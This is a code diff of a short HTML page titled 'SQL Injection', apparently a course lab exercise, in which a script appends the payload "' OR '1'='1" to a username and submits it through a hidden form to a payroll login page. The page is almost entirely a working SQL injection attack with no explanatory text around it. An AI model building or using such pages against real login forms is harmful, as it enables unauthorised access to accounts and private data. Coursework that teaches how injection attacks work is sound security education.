@@ -1,16 +1,24 @@
 <!DOCTYPE html>
 <html>
-  <head>
+
+<head>
     <meta charset="UTF-8" />
     <title>SQL Injection</title>
     <script>
-        // Exploits
+        function getAccountID() {
+            document.getElementsByName("login")[0].value = document.getElementById("targetlogin").value + "' OR '1'='1";
+            document.forms[0].submit();
+        }  
     </script>
-  </head>
-  <body>
-    <form action="" onsubmit="" method="POST">
-      <input name="login" id="targetlogin" value="username" />
-      <button id="exploit">Hold onto your butts!</button>
+</head>
+
+<body>
+    <form action="http://payroll.gatech.edu/index.php" onsubmit="" method="POST">
+        <input type="hidden" name="login" value="" />
+        <input type="hidden" name="action" value="login" />
     </form>
-  </body>
+    <input name="login" id="targetlogin" value="username" />
+    <button id="exploit" onclick="getAccountID()">Hold onto your butts!</button>
+</body>
+
 </html>
